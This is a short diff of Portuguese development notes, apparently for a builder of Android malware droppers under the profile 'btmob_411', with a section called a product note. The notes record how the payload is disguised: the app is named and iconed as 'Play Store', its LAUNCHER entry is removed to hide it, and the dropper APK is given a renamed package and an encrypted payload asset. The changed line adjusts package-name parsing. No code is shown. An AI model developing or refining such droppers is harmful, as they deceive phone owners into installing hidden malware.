@@ -38,7 +38,7 @@ Perfil: `btmob_411`
 
 - `prepare_payload` → `btmob_411`, LAUNCHER removido, `app_name` + `assets/app_name.txt` = `Play Store`, ícones mipmap = ícone Play Store
 - dropper final (`OnlyTest.apk`) → `app_name` customizado, package renomeado, launch `…MainActivity` ligado, asset cifrado do payload presente
-- `extract_apk_package_name` aceita `com.android.<a>.<b>` (4+ segmentos); o skip cego de `com.android.*` quebrava o bind do dropper neste builder
+- `extract_apk_package_name` aceita `com.android.<palavra>` (3 segmentos); pacotes `com.android.a.b` (4 segmentos) não são suportados — geração BTMOB normalizada
 
 ## Nota de produto
 
